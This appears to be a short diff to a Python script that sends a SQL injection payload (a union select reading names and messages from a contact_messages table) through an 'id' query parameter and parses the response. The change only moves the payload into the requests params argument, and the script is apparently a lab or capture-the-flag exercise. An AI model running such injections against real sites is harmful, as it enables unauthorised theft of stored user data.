@@ -9,10 +9,9 @@ injection = '\' union select name,message from contact_messages where mail= ' + 
 
 field = {'id': '1 ' + injection}
 
-params = urllib.parse.urlencode(field)
-url = ip + page + '?' + params
+url = ip + page
 
-response = get(url)
+response = get(url, params=field)
 body = response.text
 
 soup = BeautifulSoup(body, 'html.parser')
